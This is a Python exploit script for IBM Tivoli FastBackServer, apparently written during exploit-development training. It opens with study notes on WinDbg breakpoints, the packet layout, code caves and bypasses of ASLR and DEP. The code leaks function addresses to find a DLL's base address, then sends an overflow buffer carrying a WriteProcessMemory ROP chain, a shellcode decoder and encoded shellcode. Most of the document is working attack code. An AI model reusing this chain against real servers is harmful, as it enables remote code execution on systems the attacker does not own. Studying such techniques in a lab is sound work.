r"""
=============================================================================
=========================== - Breakpoints (Old) - ===========================
=============================================================================
        bp wsock32!recv
        bp FastBackServer!FX_AGENT_CopyReceiveBuff+0x1f6
        bp FastBackServer!FX_AGENT_Cyclic+0xD0
        bp FastBackServer!FXCLI_OraBR_Exec_Command
        bp FastBackServer!FXCLI_OraBR_Exec_Command+0x43b
        bp FastBackServer!FXCLI_OraBR_Exec_Command+0x4c7
        bp FastBackServer!FXCLI_OraBR_Exec_Command+0x6ac
        bp FastBackServer!FXCLI_SetConfFileChunk+0x40

=============================================================================
============================== - Breakpoints - ==============================
=============================================================================
    bp FastBackServer!FXCLI_OraBR_Exec_Command+0xd43    OpCode=0x2000
    bp FastBackServer!FXCLI_DebugDispatch+0xcc9         SymbolOperation
    bp FastBackServer!FXCLI_DebugDispatch+0xe04         SymGetSymFromName
    bp FastBackServer!FXCLI_OraBR_Exec_Command+0x7374   ReturnValue
    bp FastBackServer!FXCLI_OraBR_Exec_Command+0x96ac   ReturnValue
    bp FastBackServer!FXCLI_OraBR_Exec_Command+0x9877   BufferSend

=============================================================================
======================== - Packet/Buffer Structure - ========================
=============================================================================
        0x00       : Checksum DWORD
        0x04 - 0x34: psAgentCommand
                    - 0x04 - 0xC:   ??
                    - 0x10:         Opcde
                    - 0x14:         Offset for copy operation
                    - 0x18:         Size of copy operation
                    - 0x1C:         Offset for 2nd copy operation
                    - 0x20:         Size of 2nd copy operation
                    - 0x24:         Offset for 3rd copy operation
                    - 0x28:         Size of 3rd copy operation
                    - 0x2C - 0x34:  ??
        0x34 - End:  psCommandBuffer

=============================================================================
================================= - Notes - =================================
=============================================================================
Same func as before (FXCLI_OraBR_Exec_Command)

using a win32 api import from dbghelp.dll

function: SymGetSymFromName

FXCLI_OraBR_Exec_Command Opcode: 0x2000

BOOL IMAGEAPI SymGetSymFromName(
    [in]      HANDLE           hProcess,
    [in]      PCSTR            Name,
    [in, out] PIMAGEHLP_SYMBOL Symbol
);

typedef struct _IMAGEHLP_SYMBOL {
    DWORD SizeOfStruct;
    DWORD Address;
    DWORD Size;
    DWORD Flags;
    DWORD MaxNameLength;
    CHAR Name[1];
} IMAGEHLP_SYMBOL, *PIMAGEHLP_SYMBOL;

SymbolOperation resolves WinAPIs and stores the
results in the psCommandBuffer


getIPAddr&Port -> gets existing TCP conn to send info back to
                  switched existing connection type to recieve buffer

01b30000 01b5b000
gsk8iccs C:\Program Files\ibm\gsk8\lib\gsk8iccs.dll

01b60000 01b9a000
icclib019 C:\Program Files\ibm\gsk8\lib\N\icc\icclib\icclib019.dll

02f80000 03070000
libeay32IBM019 C:\Program Files\ibm\gsk8\lib\N\icc\osslib\libeay32IBM019.dll

Using IBM DLLs, we can ensure that our exploit is at least only tivoli
version dependent, and not dependent on windows versions

Rule of Thumb (RoT) for choosing modules is to ensure the upper bytes are
not 00, all 3 are fine here, ill use libeay32IBM019 as its the highest out
of the 3 modules

analyzing the library, an exported func `N98E_CRYPTO_get_new_lockid` has
an offset of +14E0 with an ordinal of 1026

by subtracting this offset from the leaked address of the func, we get the
base addr of the lib. this is aslr bypass

now to bypass DEP as ASLR is used in tandem to enhance DEP, we need to do
what was done before via VirtualAlloc and ROP gadgets, but this time we'll
use WriteProcessMemory to copy our code from the stack to the code
(text section)page of our target library

BOOL WriteProcessMemory(
  HANDLE  hProcess,
  LPVOID  lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesWritten
);

now to find code caves, i.e. padding bytes
0x3c from MZ header -> PE Header
0x2c from PE header -> offset to code section

0:078> ? libeay32IBM019 + 1000
03141000

now to analyze the code section
!address 03141000

Usage:                  Image
Base Address:           03141000
End Address:            031d3000
Region Size:            00092000 ( 584.000 kB)
State:                  00001000          MEM_COMMIT
Protect:                00000020          PAGE_EXECUTE_READ
Type:                   01000000          MEM_IMAGE
Allocation Base:        03140000
Allocation Protect:     00000080          PAGE_EXECUTE_WRITECOPY


This can also be done with !dh, we just need to take the upper bound of the
code section and subtract it with a very large enough value to store our
shellcode

the book only subtracted 0x400, but ive seen that 0x900 is also good enough
00000c00


note: this is very confusing to follow while working with brain fog

lib: libeay32ibm019
offset1: 0x3c                                 <- gets us to PE header
offset2: 0x2c + offset1                       <- offset of code section
CS->libeay32ibm019: baseAddress + offset1     <- Code Section
then

libeay32ibm019 baseAddress + offset2 gets us to the code section

then

we use the END_ADDRESS of the code section
    - take away 0x400 bytes to make space for our code

now

to get the offset for this, we
    - END_ADDRESS - baseAddress - 0x400 (This gives offset from baseAddress to the code cave)

ENSURE: offset does not have any null bytes


just realized, this is needless. can use pykd to automate locating code caves
wrote locateCodeCaves.py, stored in /windbg_tools


after code caves we can abuse WPM to copy our shellcode from the overflown opCode
buffer to an executable page in memory

WPM takes
- hProcess 			        <- Set to -1, stay within currentProc
- lpBaseAddress			    <- Addr to write to (BaseAddr + Offset)
- lpBuffer			        <- Shellcode stack Addr
- nSize				        <- Shellcode Size
- lpNumberOfBytesWritten	<- DWORD in the .data section


Now ROP gadgets have to be offset based
to get image base
baseDLLAddr + 3c -> PE Header
baseDLLAddr + PEHeader + 34 -> ImageBase


0253_03242026:

0934_03252026:
11.4.3 Handmade rop decoder
wrote new module called shellcode.py
already added a map to swap out bad chars for good chars
gonna follow the book along to figure out how to use ROP for decoding\\

1238_03252026:
the vid uses an offset of 0x61e, but mine is just 0x11f
offset for eax to first bad char

=============================================================================

"""

import socket
import sys

from colorama import Back, Fore, Style, init
from modules.shellcode import getShellcode
from Payload import Payload

from pwn import *
from struct import pack

DEBUG = True
BASE_ADDR_BAD = False
init()


bad_chars = [0x00, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x20]


def checkBadChars(data):
    for byte in data:
        if byte in bad_chars:
            return True
    return False


def sendMalBuff(buf, socketTup, payload=None):
    timeout_seconds = 5
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout_seconds)
            s.connect(socketTup)

            if checkBadChars(buf):
                print(Fore.RED + Back.WHITE + "[WARN] Buffer contains bad characters" + Style.RESET_ALL)

            s.sendall(buf)
            if DEBUG:
                if payload is not None:
                    payload._printBuffer(buf=buf, width="dd")
                print(f"{Fore.GREEN}o Sent {len(buf)} bytes successfully!{Style.RESET_ALL}")

            if DEBUG:
                print(Fore.CYAN + "o Waiting for response from server..." + Style.RESET_ALL)
            response = b""
            while True:
                try:
                    chunk = s.recv(1024)
                    if DEBUG:
                        print(f"{Fore.YELLOW}Received chunk: {chunk}{Style.RESET_ALL}")
                except socket.timeout:
                    break
                if not chunk:
                    break
                response += chunk
                if b"Address is:" in response:
                    break

            if not response:
                print(Fore.RED + "[!] No response received from server" + Style.RESET_ALL)
                sys.exit(1)

            return response

    except socket.timeout:
        print(Fore.RED + "[!] Socket operation timed out" + Style.RESET_ALL)
        sys.exit(1)
    except socket.error as error:
        print(Fore.RED + f"[!] Socket error: {error}" + Style.RESET_ALL)
        sys.exit(1)


def leakFunctionAddress(func, socketTup, payload=None):

    if DEBUG:
        print(Fore.CYAN + f"o Attempting to leak address for {func.decode('utf-8').strip(chr(0))}..." + Style.RESET_ALL)
    # Append SymbolOperation to the Func
    symOpFunc = b"SymbolOperation" + func

    leakPacket = Payload(logLevel="ERROR")
    leakPacket.append(b"\x41" * 0xC)  # psAgentCommand        0x04 - 0x34
    leakPacket.append([0x2000, 0x0, 0x100, 0x100, 0x100, 0x200, 0x100])
    leakPacket.append(b"\x41" * 0x8)  # N/A                   0x2C - 0x34

    # psCommandBuffer
    leakPacket.append(symOpFunc + b"A" * (0x100 - len(symOpFunc)))
    leakPacket.append(b"B" * 0x100)
    leakPacket.append(b"C" * 0x100)

    # Checksum
    buf = bytes(leakPacket.payload)

    # Checksum
    buf = pack(">i", len(buf) - 4) + buf

    response = sendMalBuff(buf, socketTup, payload=payload)
    if response:
        # Should have a valid response, parse it and get the address
        functionAddress = parseResponse(response)
        print(Fore.GREEN + f"o Leaked {func.decode('utf-8').strip(chr(0))}: {Fore.LIGHTYELLOW_EX} 0x{functionAddress:08x}" + Style.RESET_ALL)

        if functionAddress == 1:
            print(Fore.RED + f"[!] Failed to leak address for {func.decode('utf-8').strip(chr(0))}" + Style.RESET_ALL)
            sys.exit(1)
    else:
        print(Fore.RED + f"[!] No response received from server when leaking {func.decode('utf-8').strip(chr(0))}" + Style.RESET_ALL)
        sys.exit(1)
    # Return the address only
    return functionAddress


def parseResponse(response):
    """Parse a server response and extract the leaked address"""
    pattern = b"Address is:"
    address = None
    for line in response.split(b"\n"):
        if line.find(pattern) != -1:
            address = int((line.split(pattern)[-1].strip()), 16)
    if not address:
        print("[!] Could not find the address in the Response")
        sys.exit()
    return address


def main():
    global BASE_ADDR_BAD
    if len(sys.argv) != 2:
        print(f"ERR: No ip addr provided")
        exit(-1)

    server = sys.argv[1]
    port = 11460

    print(Fore.CYAN + f"o IP Addr: {server}:{port}" + Style.RESET_ALL)
    payload = Payload(badchars=[0x00, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x20])
    try:
        functions = [b"N98E_CRYPTO_get_new_lockid" + b"\x00", b"WriteProcessMemory" + b"\x00"]
        leakedAddresses = []

        """
        ************************************************************************************
        ******************************* ASLR Bypass Start***********************************
        ************************************************************************************
        """
        # Leak addresses of functions
        for func in functions:
            leakedAddresses.append(leakFunctionAddress(func, (server, port), payload=payload))
            if payload._testBadChars(leakedAddresses[-1]):
                BASE_ADDR_BAD = True

        WPMAddr = leakedAddresses[1]  # WriteProcessMemory address
        exportedFunc = leakedAddresses[0]  # N98E_CRYPTO_get_new_lockid address

        # Target Function Offset observed from loading the dll in IDA was noted
        functionOffset = 0x14E0

        libraryBase = exportedFunc - functionOffset
        print(
            Fore.GREEN
            + f"o Calculated library base via\n\t\t {functions[0].decode("utf-8")}: {Fore.LIGHTYELLOW_EX}{str(hex(libraryBase))}"
            + Style.RESET_ALL
        )

        """
        ************************************************************************************
        ************************************ Abuse WPM *************************************
        ************************************************************************************
        """
        # psAgentCommand
        commandPacket = Payload(logLevel="ERROR")
        commandPacket.append(b"\x41" * 0xC)
        commandPacket.append([0x534, 0x0, 0x1100, 0x0, 0x100, 0x0, 0x100])
        commandPacket.append(b"\x41" * 0x8)
        buf = bytearray(commandPacket.payload)

        # psCommandBuffer
        # NOTE:: My code cave is larger than the book's 0x400
        #        which is why the offset is lower than 0x92c04
        #        (0x880B0)
        wpmPacket = Payload(logLevel="ERROR")
        wpmPacket.append(
            [
                WPMAddr,
                libraryBase + 0x92C04,
                0xFFFFFFFF,
                libraryBase + 0x92C04,
                0x41414141,
                0x42424242,
                libraryBase + 0xE401C,
            ]
        )
        wpmPacket.append(b"A" * 0x10)
        wpm = bytes(wpmPacket.payload)

        offset = b"A" * (276 - len(wpm))
        # 1803_1011 (IGNORE, fixed):
        # Well, something is up with how the PPR gadget is being handled, i lose my 0x030d08d6 for 0x050008d6
        # 030d -> 0500
        #
        # the lower 4 bytes are fine, but the upper 4 are being fked with.
        # i need to subtract 0x01f30000 or add 0xfe0cffff if i want my original gadget back
        # ====== Stack layout ======
        # ROP: push int3*5; ret
        # 0xfe0cffff
        # pop reg | add popReg, reg, push popReg; ret
        # should have -> ROP: push esp; pop esi; ret
        #
        # IGNORE THE ABOVE. REASON:
        #                         restarting the PC gave me a new base address and so now it works as expected
        # eip = pack("<L", (libraryBase + 0x00087E3B))  # (0x03117e3b) int3; int3; int3; int3; int3; ret; <- debugging
        eip = pack("<L", (libraryBase + 0x000408D6))  # (0x030d08d6) push esp; pop esi; ret <- Save ESP to ESI
        # eip = pack("<L", (0x41424345))  # push esp; pop esi; ret <- Save ESP to ESI

        # ! DEBUG: eip: 0x030d08d6
        # DD DD DD DD
        # DD DD DD D6
        # DD DD D8 D6
        # DD DD 08 D6
        # DD 0D 08 D6   <- this broke the flow, got 00 00 08 D6

        # eip = pack("<L", (0xDD0D08D6))  # push esp; pop esi; ret <- Save ESP to ESI
        print(f"{Fore.GREEN}! DEBUG: eip: {hex(libraryBase + 0x408D6)}{Style.RESET_ALL}")

        """
        ************************************************************************************
        ***************************** Stage 1a: Patch lpBuffer *****************************
        ************************************************************************************
        """
        ropPacket = Payload(logLevel="ERROR")

        # Patching lpBuffer, need it to point to our shellcode address on stack.
        ropPacket.append(
            [
                libraryBase + 0x296F,  # mov eax, esi; pop esi; ret  | Save ESP to EAX+ESI
                0x42424242,  # dummy value
                libraryBase + 0x117C,  # pop ecx; ret
                0x88888888,  # push huge value to "subtract"
                libraryBase + 0x1D0F0,
                libraryBase + 0x117C,  # pop ecx; ret
                0x77777D78,
                libraryBase + 0x1D0F0,  # add eax, ecx; ret
            ]
        )

        """
        ************************************************************************************
        ********************** Stage 1b: Patch lpNumberOfBytesWritten **********************
        ************************************************************************************
        """
        # 1603_0303:
        ropPacket.append(
            [
                libraryBase + 0x8876D,  # mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010
                0x42424242,  # junk into esi
                libraryBase + 0x48D8C,  # pop eax ; ret
                0x42424242,  # junk for ret 0x10
                0x42424242,  # junk for ret 0x10
                0x42424242,  # junk for ret 0x10
                0x42424242,  # junk for ret 0x10
                0xFFFFFEE0,  # pop into eax
                libraryBase + 0x1D0F0,  # add eax, ecx ; ret
                libraryBase + 0x1FD8,  # mov [eax], ecx ; ret
            ]
        )

        """ 
        ************************************************************************************
        ****************************** Stage 1c: Patch lpSize ******************************
        ************************************************************************************
        """
        # 1803_1046:
        # Patching nSize arg
        ropPacket.append(
            [
                libraryBase + 0xBC79,  # inc eax; ret
                libraryBase + 0xBC79,  # inc eax; ret
                libraryBase + 0xBC79,  # inc eax; ret
                libraryBase + 0xBC79,  # inc eax; ret
                libraryBase + 0x408DD,  # push eax; pop esi; ret
                libraryBase + 0x48D8C,  # pop eax; ret
                0xFFFFFDF4,  # -524
                libraryBase + 0x1D8C2,  # neg eax ; ret
                libraryBase + 0x8876D,  # mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010
                0x42424242,  # junk into esi
                libraryBase + 0x1FD8,  # mov [eax], ecx ; ret
                0x42424242,  # junk for ret 0x10
                0x42424242,  # junk for ret 0x10
                0x42424242,  # junk for ret 0x10
                0x42424242,  # junk for ret 0x10
            ]
        )

        """
        ************************************************************************************
        *************************** Stage 1d: Shellcode Decoding ***************************
        ************************************************************************************
        """
        ropPacket.append(
            [
                libraryBase + 0x117C,  # pop ecx ; ret
                0xFFFFFFFF,  # pop ecx ; ret
                libraryBase + 0x4A7B6,  # sub eax, ecx; pop ebx; ret
                0x11110111,  # Load 0x01 in BH
                libraryBase + 0x468EE,  # add [eax+1], bh; ret
            ]
        )

        """
        ************************************************************************************
        ******************************** Stage 1e: Align ESP *******************************
        ************************************************************************************
        """
        # 18032026_1057:
        # Align ESP with ROP Skeleton
        # EAX points 0x14 bytes ahead of WPM on stack
        # This will jump EIP back straight up towards the WPM address call
        ropPacket.append(
            [
                libraryBase + 0x117C,  # pop ecx ; ret
                0xFFFFFFEC,  # -0x14
                libraryBase + 0x1D0F0,  # add eax, ecx ; ret
                libraryBase + 0x5B415,  # xchg eax, esp ; ret
            ]
        )

        rop = bytes(ropPacket.payload)

        """
        ************************************************************************************
        **************************** Stage 2: Shellcode Encoding ***************************
        ************************************************************************************
        """
        # 0257_03242026:
        # Start of 11.4.2
        # alr know meterpreter shellcode wont run here, just reading through all this
        # REASON:: mfsvenom uses a Encoder/Decoder to avoid badchars. This requires the use of writeable memory
        #          which is not available in this case as WPM restores the default protections which were read/exec
        offset2 = b"C" * (0x600 - len(rop))  # This was calculated by subtracting lpBuffer address to the end of our ROP chain
        shellcode = getShellcode(encoded=True)[:20]  # Get encoded shellcode, moving forward we
        print(f"{Fore.GREEN}o Encoded Shellcode {Style.RESET_ALL}")
        payload._printBuffer(buf=shellcode, width="db")

        # SHELLCODE ENCODING:
        # The ropchain to decode the shellcode is to be placed before the ESP alignment section

        # Padding (Followed the vid)
        padding = b"D" * (0x1000 - 276 - 4 - len(rop) - len(offset2) - len(shellcode))

        # Prepare buffer + add checksum
        buffer = offset + wpm + eip + rop + offset2 + shellcode + padding
        buf += b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (buffer, 0, 0, 0, 0)
        buf = pack(">i", len(buf) - 4) + buf  # Checksum DWORD        0x00 - 0x04

        # Warn Base Address(es) might be bad
        if BASE_ADDR_BAD:
            print(
                Fore.RED
                + Back.WHITE
                + "[WARN] One or more leaked addresses contain bad characters, base address calculations may be incorrect"
                + Style.RESET_ALL
            )

        # Send Final Buffer
        print(f"{Fore.CYAN}o Sending final buffer...{Style.RESET_ALL}")
        sendMalBuff(buf, (server, port), payload=payload)

    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] User requested shutdown" + Style.RESET_ALL)
        return 1


if __name__ == "__main__":
    sys.exit(main())
